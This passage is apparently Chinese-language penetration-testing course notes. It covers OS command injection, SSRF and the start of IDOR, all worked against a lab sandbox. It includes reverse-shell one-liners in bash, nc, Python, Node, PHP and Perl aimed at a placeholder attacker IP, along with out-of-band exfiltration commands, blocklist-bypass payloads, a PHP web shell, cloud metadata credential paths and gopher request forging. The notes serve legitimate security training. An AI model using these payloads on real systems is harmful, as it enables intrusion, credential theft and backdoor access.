  command 'chr' from deb chr-tiny
Try: sudo apt install <deb name>
uid=1000(chw) gid=1000(chw) groups=1000(chw),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),117(bluetooth),121(wireshark),127(scanner),134(kaboxer)
                                 
```

#### - Linux [inline execution](https://www.rangeforce.com/blog/how-to-prevent-blind-command-injection) mechanisms
Linux 特性可以利用反引號 ``` 和`$()` 包裝指令
```
`cmd`
$(cmd)
```
(範例)
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ echo "This is an echo statement"  
This is an echo statement
     
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ echo "This is an `whoami` echo statement"
This is an chw echo statement
                                     
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ echo "This is an $(whoami) echo statement"
This is an chw echo statement
```

若程式碼指令中執行完即輸出，不顯示第二個指令\
可利用 `? /dev/null`
```
?ip=127.0.0.1 > /dev/null;cat%20/flag
```
> stdout 只剩 cat 🐱

## Dealing with Common Protections
Web application 通常會對使用者提供的資料執行輸入 normalization ，對於 cmdi payload 不利

在 cmdi payload 到 shell 之間都有可能被 normalize
```
Browser / curl
→ URL parser
→ Web Server (Apache / Nginx)
→ Web App (Node / PHP / Python)
→ system / exec
→ /bin/sh

```

例如 payload: `bash -i >& /dev/tcp/ATTACKER/9090 0>&1`\
在 URL 中： `?ip=127.0.0.1|bash -i >& /dev/tcp/...`\
> 在 URL 中 `&` 代表後面是另一個 HTTP 參數
>> 導致 Web Server: `ip=127.0.0.1|bash -i >`

### Typical Input Normalization - Sending Clean Payloads
為確保 paylaod 即使經過不同的處理過程也能正確執行\
探討 bad character replacement, character escapes, URL encoding 和 payload wrapping

1. 用 bash -c 包裝
可以在 command 外加上 `bash -c '[COMMAND]'` 緩解錯誤字元的問題， 
```
bash -c 'COMMAND'
```
(範例：建立 Reverse Shell)\
原始 URL
```url
http://ci-sandbox/php/index.php?ip=127.0.0.1;bash -i >& /dev/tcp/{Kali IP}/8888 0>&1
```
> `&` 會讓 URL 誤導成是參數

透過 bash -c 包裝
```url
http://ci-sandbox/php/index.php?ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/{Kali IP}/8888 0>&1'
```
![image](https://hackmd.io/_uploads/r1hEGmyDWe.png)

但 Request 需要整理成一行 Query

2. URL Encode 危險字元
透過 Burp reapter 進行 URL encode:\
`Convert Selection` > `URL` > 
`URL Encode Key Characters`\
![image](https://hackmd.io/_uploads/SyQCfmyPbg.png)
```
bash+-c+'bash+-i+>%26+/dev/tcp/{Kali IP}/8888+0>%261'
```
送出 Payload 後檢查 Netcat\
可以看到 nc 成功看到 Reverse shell\
![image](https://hackmd.io/_uploads/HJi8m71DZl.png)

### Typical Input Sanitization - Blocklisted Strings Bypass
Blocklist 不是防指令，是防字串長得像指令 👀\
👉🏻 讓 shell 看得懂，但 filter 看不懂

[環境範例]
```
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;whoami
```
![image](https://hackmd.io/_uploads/BJyJUQkPZe.png)
> 可以看到 Server 對 `whoami` 做黑名單，字串被阻擋

#### - 利用 `$()` 繞過 Blacklist
先從 Terminal 驗證：`wh$()oami`, `n$()c`
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ wh$()oami
chw

┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ n$()c -nv$()lp 8888   
listening on [any] 8888 ...

```
> 儘管在 cmd 塞入 $() 還是能夠正常執行
> > `$()` 在 shell 中稱為 command substitution，但裡面為 Null 所以不影響

```
http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami
```
![image](https://hackmd.io/_uploads/B1b8w71D-l.png)
> 成功繞過 Blacklist Filter

#### - 利用 Wfuzz 結合 Bypass list
先建立自定義的 bypass wordlist
```
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```
![image](https://hackmd.io/_uploads/SJokuXJw-x.png)

利用 wfuzz 進行混淆爆破
```
wfuzz -c -z file,./command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ
```
![image](https://hackmd.io/_uploads/BJJqO7yPWe.png)

#### - Base64 encode
為繞過特殊字元 (Ex. 反引號) 或特殊字串 (Ex. etc, passwd)，可嘗試進行 base64 encode

將 `cat /etc/passwd` encode
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ echo "cat /etc/passwd" |base64
Y2F0IC9ldGMvcGFzc3dkCg==
```
傳入 URL 測試，再搭配 `|base64 -d` 解碼
```
?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
```
![image](https://hackmd.io/_uploads/rJDaFXyPZx.png)


>[!Tip]
> 若目標機器不存在 base64 binary 👉🏻 `|base64 -d` 無效\
> 可以繼續嘗試 openssl: 
> - `echo "cat /etc/passwd" | openssl base64`
> - `;echo Y2F0IC9ldGMvcGFzc3dkCg== | openssl base64 -d`
>
> WHY openssl ?
> - 幾乎所有 Linux 系統都有（比 base64 還常見）
. - 可直接做 Base64 編碼 / 解碼
> - 不需要額外套件

### Blind OS Command Injection Bypass
Blind OS Cmdi 主要針對指令有被執行，但看不到 stdout
#### - sleep command
利用休眠時間判斷，讓目標伺服器休眠一段時間，若指定秒數後頁面內容恢復正常，可以成功識別出異常情況
(正常輸入)
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1
<html>
<head>
<link rel="stylesheet" href="../css/bootstrap.min.css">
<style type="text/css">
body{
  background-color: #121212;
 ...
</body>
</html>

real    0.19s
user    0.00s
sys     0.02s
cpu     11%
```
> time cmd 可以看到過程耗時 0.19 秒

(注入 Sleep 20 second)
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
<html>
<head>
<link rel="stylesheet" href="../css/bootstrap.min.css">
<style type="text/css">
body{
  background-color: #121212;
...

</body>
</html>

real    20.19s
user    0.01s
sys     0.01s
cpu     0%
```
> 在注入後可以看到過程耗時了 20.19 秒

#### - Out-of-Band（OOB）回傳
在 Blind OS Cmdi 中，若確認 sleep 成功後，可透過 OOB 將結果回傳至攻擊本機
- HTTP
```
;wget http://{Kali IP}/$(whoami)
```
(範例)
```
http://ci-sandbox/php/blind.php?ip=127.0.0.1;wget%20http://{Kali IP}/$(whoami)"
```
![image](https://hackmd.io/_uploads/rJLUJE1w-e.png)

(Kali)\
![image](https://hackmd.io/_uploads/HyEvkVywWl.png)
> 在 Kali HTTP Server 上成功收到 `$(whoami)` 內容


- DNS
```
;ping -c 1 $(whoami).attacker.com
```

- Reverse Shell
```
;bash -c 'bash -i >& /dev/tcp/{Kali IP}/8888 0>&1'
```

(範例)
```
http://ci-sandbox/php/blind.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{Kali IP}%2F8888%200%3E%261%27
```
![image](https://hackmd.io/_uploads/SkXZMVJDWx.png)

(Kali)\
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ nc -nvlp 8888
[2026-02-03 16:29:07] nc -nvlp 8888
listening on [any] 8888 ...
connect to [{Kali IP}] from (UNKNOWN) [192.168.145.101] 56186
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@88e72676cfcd:/var/www/html/php$
```
> 在 Kali nc 中成功取得 reverse shell

## Enumeration and Exploitation

### Enumerating Command Injection Capabilities
在發現 Command Injection 漏洞後，接著需要了解可以利用哪些功能取得目標機器的 shell。大多數現代武器化程式碼和惡意軟體都會使用腳本語言，以便在成功執行後實現檔案傳輸功能

可以在取得 command 後對目標機器進行明確檢查，尋找以下 binaries：
Command | Used For |
:------|:---------------------|
wget  |    	File Transfer    |
curl  |    	File Transfer    |
fetch  |    	File Transfer   | 
gcc  |    Compilation    | 
cc  |    Compilation    |
nc  |    Shells, File Transfer, Port Forwarding    |
socat  |    Shells, File Transfer, Port Forwarding    |
ping  |    Networking, Code Execution Verification    |
netstat  |    Networking    |
ss  |    Networking    |
ifconfig  |    Networking    |
ip  |    Networking    |
hostname  |    Networking    |
php  |    	Shells, Code Execution    |
python  |    	Shells, Code Execution    |
python3  |    	Shells, Code Execution    |
perl  |    	Shells, Code Execution    |
java  |    	Shells, Code Execution    |

取得程式碼執行權限以及進行枚舉時必須執行的工具

(Windows)

Capability | Used For |
:------|:---------------------|
Powershell  |    	Code Execution, Enumeration, Movement, Payload Delivery    |
Visual Basic  |    	Code Execution, Enumeration, Movement, Payload Delivery    |
tftp  |    	File Transfer   | 
ftp  |    File Transfer    | 
certutil  |    File Transfer    |
Python  |    Code Execution, Enumeration    |
.NET  |    Code Execution, Privilege Escalation, Payload Delivery    |
ipconfig  |    Networking    |
netstat  |    Networking    |
hostname  |    Networking    |
systeminfo  |    System Information, Patches, Versioning, Arch, etc.    |

可以建立枚舉清單，利用 wfuzz 搜尋
```
┌──(chw💲CHW)-[~/Offsec/OSWA/Cmdi]
└─$ cat capability_checks_custom.txt 
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat  
ss
ifconfig
ip
hostname
php
python
python3
perl
java
                                                                                                                             
┌──(chw💲CHW)-[~/Offsec/OSWA/Cmdi]
└─$ wfuzz -c -z file,./capability_checks_custom.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which%20FUZZ
Total requests: 19

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000000018:   200        11 L     69 W       505 Ch      "perl"                                                      
000000016:   200        11 L     69 W       507 Ch      "python"                                                    
000000007:   200        11 L     69 W       499 Ch      "nc"                                                        
000000003:   200        11 L     69 W       505 Ch      "curl"                                                      
000000019:   200        10 L     68 W       491 Ch      "java"                                                      
000000001:   200        10 L     68 W       491 Ch      "w00tw00t"                                                  
000000017:   200        11 L     69 W       508 Ch      "python3"                                                   
000000006:   200        11 L     69 W       503 Ch      "cc"                                                        
000000014:   200        11 L     69 W       506 Ch      "hostname"                                                  
000000015:   200        11 L     69 W       511 Ch      "php"                                                       
000000008:   200        10 L     68 W       491 Ch      "socat"                                                     
000000002:   200        11 L     69 W       505 Ch      "wget"                                                      
000000005:   200        11 L     69 W       504 Ch      "gcc"                                                       
000000012:   200        11 L     69 W       506 Ch      "ifconfig"                                                  
000000010:   200        11 L     69 W       504 Ch      "netstat"                                                   
000000009:   200        11 L     69 W       501 Ch      "ping"                                                      
000000011:   200        10 L     68 W       491 Ch      "ss"                                                        
000000004:   200        10 L     68 W       491 Ch      "fetch"                                                     
000000013:   200        10 L     68 W       491 Ch      "ip"                                                        

Total time: 8.503796
Processed Requests: 19
Filtered Requests: 0
Requests/sec.: 2.234296
```

### Obtaining a Shell - Netcat
```
?ip=127.0.0.1|/bin/nc -nv {Kali IP} 8888 -e /bin/bash
```
### Obtaining a Shell - Python
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{Kali IP}",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
注入 URL
```
?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22{Kali IP}%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

### Obtaining a Shell - Node.js
將三個 commands chain 成一個 reverse shell
```
echo "require('child_process').exec('nc -nv {Kali IP} 8888 -e /bin/bash')" > /var/tmp/chw.js ; node /var/tmp/chw.js
```
注入 URL
```
?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20{Kali IP}%208888%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Fchw.js%20%3B%20node%20%2Fvar%2Ftmp%2Fchw.js
```
### Obtaining a Shell - PHP
各種 PHP one-liner reverse shell 
```php
php -r '$sock=fsockopen("{Kali IP}",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{Kali IP}",8888);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{Kali IP}",8888);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{Kali IP}",8888);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("{Kali IP}",8888);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
> `/bin/sh -i <&3 >&3 2>&3`:
> - `<&3`：shell 的 stdin 從 FD3 讀
> - `>&3`：stdout 寫到 FD3
> - `2>&3`：stderr 也寫到 FD3

![image](https://hackmd.io/_uploads/BydSzrJD-e.png)

1. [exec()](https://www.php.net/manual/en/function.exec.php)
```php
exec("/bin/sh -i <&3 >&3 2>&3");
```
exec() 會執行命令，但預設不將輸出直接印到網頁回應
- 很常被 disable_functions 禁掉
- 若只看 HTTP 回應，可能沒反應，檢查 nc 連線

2. [shell_exec()](https://www.php.net/manual/en/function.shell-exec.php)
```php
shell_exec("/bin/sh -i <&3 >&3 2>&3");
```
shell_exec() 透過 /bin/sh -c 形式執行，會將命令的 stdout 當成 字串回傳（但 stdout 已經 >&3 丟走了）
- 因為 shell_exec() 是走 shell，對複雜字元、pipeline、變數更直覺
- 也常被禁掉

3. [system()](https://www.php.net/manual/en/function.system.php)
```php
system("/bin/sh -i <&3 >&3 2>&3");
```
system() 會執行命令，並且將命令輸出直接送到目前的 PHP 輸出（HTTP response），但在 reverse shell 這個寫法下，stdout/stderr 都被導到 FD3
- 在非 reverse shell 的測試下（例如 system("id");）很有用，因為你會在頁面可以直接看到 id 輸出。

4. [passthru()](https://www.php.net/manual/en/function.passthru.php)
```php
passthru("/bin/sh -i <&3 >&3 2>&3");
```
passthru() 類似 system()，更偏向原樣輸出 raw bytes（特別是 binary output ）。在 reverse shell 情境一樣，因為重導到 FD3，HTTP 不會顯示。
- 若在做  "binary 結果直接回傳頁面"（例如 passthru("tar cz ...")），會比 system() 更直觀


5. [popen()](https://www.php.net/manual/en/function.popen.php)
```php
popen("/bin/sh -i <&3 >&3 2>&3", "r");
```
popen(cmd, mode) 會開一個 process pipe，回傳 file pointer，可以用它讀/寫子程序。
- 接近用 PHP 程式跟子程序互動的用法
- 在某些限制下，exec/system 被禁但 popen 沒禁


注入 URL
```
?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{Kali IP}%2F8888%200%3E%261%27%5C%22)%3B%22
```

### Obtaining a Shell - Perl
```perl
perl -e 'use Socket;$i="{Kali IP}";$p=ㄚ8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
注入 URL
```
?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22{Kali IP}%22%3B%24p%3D8888%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
```

### File Transfer
假設無法從目標機器執行任何類型的 system shell
此假設在模擬：目標機器經過某種程度的 hardened，從而阻止先前的方法\
❌ 不能直接拿 shell（bash / sh 被擋）\
❌ 不能 inline reverse shell（bash -i, python -c 等被封）\
✅ 仍可執行單次 OS 指令

1. 確認可用的檔案下載工具
```
which wget
which curl
which fetch
```

2. 在 Kali 準備 Payload Binary
- 啟用 Apache
```
sudo cp /bin/nc /var/www/html/
sudo service apache2 start
```

3. 構造 one-liner 的 Command Injection Payload
```
wget http://{Kali IP}/nc -O /var/tmp/nc ;
chmod 755 /var/tmp/nc ;
/var/tmp/nc -nv {Kali IP} 8888 -e /bin/bash
```
注入 URL
```
wget%20http://{Kali IP}:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20{Kali IP}%208888%20-e%20/bin/bash
```


>[!Important]
> 在標準 Linux 系統中，可讀 / 可寫 / 可執行（world-writable, 777 或 rwx）、且在實戰中最常被用來落地 payload 的三個目錄:
> `/tmp/`, `/var/tmp/`, `/dev/shm/`


### Writing a Web Shell
在以下情境下：
- 沒有 nc / python / perl / bash -i
- egress 被擋（出不了網）
- 防火牆只允許 HTTP/HTTPS
- 只能執行指令，但不能互動

👉 Web Shell 是最低成本、最高成功率的 foothold

#### 1. 找 Document Root
確認 Document Root 的目的在於：\
Web Shell 寫在這 = 立即可用
```
pwd
```

#### 2. 寫 Web Shell 
`passthru()`:直接執行 system command，原樣輸出 stdout（最適合  web shell）
```
echo+"<pre><?php+passthru(\$_GET['cmd']);+?></pre>"+>+/var/www/html/webshell.php
```
注入 URL
```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
```

瀏覽 Web Shell
```
http://ci-sandbox/webshell.php?cmd=ls -lsa
```

# Server-side Request Forgery
[Server-side Request Forgery](https://en.wikipedia.org/wiki/Server-side_request_forgery) (SSRF) 是指攻擊者能夠強制應用程式或伺服器請求資源。由於請求源自伺服器，因此攻擊者可能能夠存取其無法直接存取的資料\
SSRF = User 不能連的東西，讓伺服器幫你連

## Introduction to SSRF
由於來源是伺服器，能夠：
- 存取 127.0.0.1
- 存取 localhost
- 存取內網 10.x / 172.16.x / 192.168.x
- 存取 cloud metadata
- 存取內部 [microservices](https://en.wikipedia.org/wiki/Microservices)

### Interacting with the Vulnerable Server
利用 SSRF 漏洞與易受攻擊伺服器的 [loopback interface](https://en.wikipedia.org/wiki/Loopback#Virtual_loopback_interface) 進行互動: 
`http://127.0.0.1` 或 `http://localhost`

Loopback 最低成本、最高命中率的測試點：
- 不用猜內網拓樸
- 不用掃描整個 subnet
- 幾乎每台機器都有 
- 很多服務只綁 loopback」

可以透過 `netstat` 驗證
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ netstat -lnt
[2026-02-03 20:50:23] netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN     
...    
tcp6       0      0 127.0.0.1:55688         :::*                    LISTEN
```
> `127.0.0.1:55688`: Burp Suite 的監聽 port

![image](https://hackmd.io/_uploads/HkwUxOJDWx.png)
> 從本機 loopback 能連，外部 IP 不能連

### Interacting with Back-end Systems and Private IP Ranges
在不知道內網拓樸的情況下，哪些地方值得探測

三個 private IP 既定的 address:\
![image](https://hackmd.io/_uploads/rkDxG_Jv-x.png)\
👉 用 SSRF brute-force 掃內網 (困難)

一些雲端服務供應商會在指定的 [Link-local address](https://en.wikipedia.org/wiki/Link-local_address) 或 predefined hostnames 上執行特殊服務\
Ex. AWS EC2 instances 可以存取 169.254.169.254 上的 [metadata services](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)\
若攻擊者利用 AWS 雲端環境中的 SSRF 漏洞，就有可能存取此元資料服務並取得敏感資料

## Testing for SSRF

### Discovering SSRF Vulnerabilities
SSRF 漏洞可能存在於允許使用者透過連結上傳檔案，而非直接提交檔案給應用程式，若發現此類上傳功能或找到 URL、URI 或 link 的參數，可以嘗試 SSRF 測試

[環境範例]\
![image](https://hackmd.io/_uploads/HJjO3mxvbl.png)

環境可以透過 curl, wget 或 Python requests library 進行測試\
![image](https://hackmd.io/_uploads/Hy_76Qgwbl.png)
![image](https://hackmd.io/_uploads/B10vg4eDZx.png)
> 可以存取 HTML source

有些應用程式會接受一個 URL 或 link，並透過 GET 或 HEAD 請求來驗證其是否存在，稱為 `Blind SSRF` 攻擊\
![image](https://hackmd.io/_uploads/HkmxZElvWg.png)

### Calling Home to Kali
如何驗證 SSRF 順便辨識後端環境，讓應用程式向我們的伺服器發送 Request
透過 User-Agent header 洩露有關該應用程式的重要資訊

- 開啟 Kali Apache
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ sudo systemctl restart apache2       
                            
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ sudo tail -f /var/log/apache2/access.log
127.0.0.1 - - [04/Feb/2026:10:15:28 +0800] "GET /favicon.ico HTTP/1.1" 404 485 "http://fbi.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"


```
- 在環境範例瀏覽 Kali Apache
![image](https://hackmd.io/_uploads/rynIM4eD-e.png)\
(Kali)\
![image](https://hackmd.io/_uploads/BkC_zEgvZx.png)
透過 Apache access.log 可以得知環境範例向 Kali 發送 GET request。User-agent為 python-requests/2.26.0 

得知後端環境：後續 exploitation 擴展攻擊面
- Python：
    - 利用 `file://`
    - 打 `gopher://`
    - 繞過 `redirect`
    - SSRF → `internal API`
- Java：
    - `JNDI`
    - `RMI`
    - 特定 `URL parser` 行為

## Exploiting SSRF

### Retrieving Data
透過環境範例功能瀏覽本機限制 Remote access denied. 的環境\
![image](https://hackmd.io/_uploads/ryIyLNxDbe.png)\
利用 Preview Link 功能瀏覽 /status\
![image](https://hackmd.io/_uploads/BJ3r8VgPWl.png)

只能讀取 admin-only 的頁面，但不能控制的項目：
- HTTP method: 只能 GET
- Headers: 不能加 Authorization
- Cookies: 沒 session
- Body: 無法 POST JSON
- Redirect: 可能不會 follow


### Instance Metadata in Cloud
雲端環境 SSRF → Instance Metadata 核心目標

#### 1. AWS
- Metadata IP（固定）：`http://169.254.169.254/`
- 路徑：
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
有機會拿到 AccessKeyId, SecretAccessKey, SessionToken\
👉🏻 雲端帳號存取權

AWS IMDSv2 較新，需要 POST 與 Token
```
PUT /latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
```

#### 2. Google Cloud (GCP)
- Metadata hostname：`http://metadata.google.internal/`
- 路徑：
```
http://metadata.google.internal/computeMetadata/v1/
```
> 需要帶 Header: `Metadata-Flavor: Google`

#### 3. Azure
- Metadata IP（固定）：`http://169.254.169.254/`
- 路徑：
```
http://169.254.169.254/metadata/instance?api-version=20xx-xx-xx
```

>[!Note]
>`169.254.169.254` 被定義為 Link-Local IP Address
>- 提供實例元資料（instance metadata）
>- IP 範圍 `169.254.0.0/16` 是 IETF 規範中保留的 Link-Local address 空間，只能在同一個網路介面上存取，不會被路由到外網

### Bypassing Authentication in Microservices
SSRF 可以站在內網身分對其他 microservice 發送請求，繞過 API Gateway / Auth / ACL

正常架構：
```
[ Internet ]
     |
     v
[ API Gateway / Reverse Proxy ]
   - Auth
   - JWT
   - ACL
   - IP allowlist
     |
     v
[ Microservice A ] -----> [ Microservice B ]
```
API gateway 對進入內網流量限制的任何安全措施，都不會適用於兩個 Microservices 之間的流量，因為流量來自於內網\
可以藉此特性，利用 SSRF 收集內網訊息

SSRF 路徑：
```
SSRF Point
 |
 v
[ Microservice A (SSRF) ]  ----內網---->  [ Microservice B ]
```

### Alternative URL Schemes
SSRF 不只測 http/https，可以用不同 scheme 測試後端用不同 client 行為

每個 URL scheme 都有對應的 protocol。有時 protocol 和 scheme 會互換使用。
這兩個 terms 看似可以互換，但實際上 HTTP  protocol 有幾個不同的版本，Ex. HTTP/1.0、HTTP/1.1 和 HTTP/2.0，它們都使用相同的 URL scheme\
當遇到 SSRF 也應測試 application 會傳送哪些 protocol 和 scheme，有些 user-agents 支援 [File](https://en.wikipedia.org/wiki/File_URI_scheme) scheme，可以使用 `/` 省略主機名稱（Ex. file:/tmp/foo.txt），或使用 `///` 表示 empty hostname（Ex. file:///tmp/foo.txt）

#### - File scheme 
例如 Kali Firefox 的預設頁面：使用 File scheme\
![image](https://hackmd.io/_uploads/B1NDLLePWx.png)

透過環境範例，嘗試 `file:///etc/passwd`\
![image](https://hackmd.io/_uploads/r1rCILewWx.png)
> An exception occurred: 缺乏細節，只能猜測應用程式不支援 File scheme\
> 也可以嘗試：`file:///c:/windows/win.ini` 檢視後端 OS

將 Utility 改成 curl method\
![image](https://hackmd.io/_uploads/S11vD8ePbl.png)
> Curl supports file scheme\
> 也藉此得知 Python Requests 不支援 file scheme

#### - Gopher scheme 
有些 user-agents 支援 Gopher scheme，可以利用 gopher 繞過傳統 SSRF 漏洞限制\
Curl 仍然支援 Gopher scheme，且允許 URL 中使用換行符。當我們使用 curl 發送基於 Gopher 協定的請求時，我們可以使用換行符在請求中註入頭部資訊。也可以使用 Gopher URL 建立多種不同 protocol（包括 HTTP）的請求

**用 SSRF + gopher 偽造一個完整協定請求**

利用 nc 開啟監聽，並透過 curl gopher 發送 request\
![image](https://hackmd.io/_uploads/By98YUlD-l.png)

>[!Tip]
> Gopher 規範會把 path 的第一個字元當 selector，路徑的第一個字元會被截斷

##### - GET Request
透過 gopher 發送 request 成功，嘗試偽造 GET Request\
gopher 允許 URL 中使用換行符，能夠構造出 HTTP Request
```
curl gopher://127.0.0.1:8888/_GET%20/hello_gopher%20HTTP/1.1
```
![image](https://hackmd.io/_uploads/Hkj-1KeD-l.png)

##### - POST Request
利用 gopher 構造出 POST Request
```
curl gopher://127.0.0.1:8888/_POST%20/status%20HTTP/1.1%0a
```
![image](https://hackmd.io/_uploads/B1ZWxtgwZe.png)


嘗試在範例環境中傳送 POST

![image](https://hackmd.io/_uploads/ByOMftlPZg.png)
> 405 METHOD NOT ALLOWED 能驗證：
> 1. Server 不接受 POST Method
> 2. gopher 構造出的 Request 有效


透過 Burp 觀察，可以得知 URL encode 過兩次：\
![image](https://hackmd.io/_uploads/SJ9TQtlPZg.png)
1. 瀏覽器 → web app
2. web app → SSRF request

若不做 URL double encode，後端永遠看不到換行

POST Request 完整範例：
```
gopher://backend:80/_POST%20/login%20HTTP/1.1%0d%0aHost:%20backend%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2041%0d%0a%0d%0ausername=chw%26password=chwpass
```

🎯 Python 環境路徑猜測：
```
file:///app/app.py
file:///app/main.py
file:///app/server.py
file:///var/www/html/app.py
file:///var/www/app.py
file:///opt/app/app.py
```


‼️ SSRF 決策流程：
```
發現 SSRF
  |
  v
判斷後端用什麼 client
  |
  +--> Python requests → 只能 http/https
  |
  +--> curl / PHP → 試 file://
  |                  |
  |                  +--> 成功 = LFI
  |
  +--> curl 支援 gopher
           |
           +--> HTTP smuggling
           +--> POST / PUT
           +--> 打 Redis / MySQL / internal API
```

# Insecure Direct Object Referencing (IDOR)
[Insecure Direct Object Referencing](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#introduction) (IDOR) 指 Web application 使用的資源本身暴露了 internal object 的資訊。意味著 Web application 沒有驗證這些檔案的權限，Ex. files, users 或 database information

IDOR 漏洞會影響應用程式資料的機密性，此類漏洞的嚴重程度取決於洩漏的資料

![image](https://hackmd.io/_uploads/B1TDZqWvWx.png)
> Maybe IDOR her

IDOR 與 Path Traversal 差異：
Type | Key Point |
:------|:---------------------|
IDOR  |    	合法路徑 + 不合法對象    |
Path Traversal  |    	不合法路徑（../）

## Introduction to IDOR
### Static File IDOR

[環境範例]\
觀察 URL query: `/docs/?f=1.txt`\
![image](https://hackmd.io/_uploads/BkkNSqWPWx.png)

後端寫法通常是：
```php
readfile("/var/www/docs/" . $_GET['f']);
```
- `1.txt` 直接對應到實體檔案
- 沒有驗證 user 權限是不是該看到這個檔案
- 可以猜測、枚舉路徑檔案
```
/docs/?f=2.txt
/docs/?f=3.txt
/docs/?f=backup.txt
/docs/?f=admin-notes.txt
```

探索在實際應用中遇到的 Static File IDOR，可以出現在 URL 中使用 NodeJS，或使用 routed parameter\
以下 URI 由 ExpressJS 處理的 routed endpoint:
```
/users/:userIdent/documents/:pdfFile
# /users/18293017/documents/file-15 (PDF Retrieved)

/trains/:from-:to
# /trains/LVIV-ODESSA               (Ticket File Retrieved)

/book/:year-:author
# /book/1996-GeorgeRRMartin         (Book Retrieved)
```

### Database Object Referencing (ID-Based) IDOR
ID-Based 指的是 endpoint 引用資料庫中的物件並在網頁上呈現，但這種引用方式並不安全

[環境範例]\
觀察 URL query: `/customerPage/?custId=1`\
![image](https://hackmd.io/_uploads/ry9nKo-v-e.png)

後端寫法通常是：
```sql
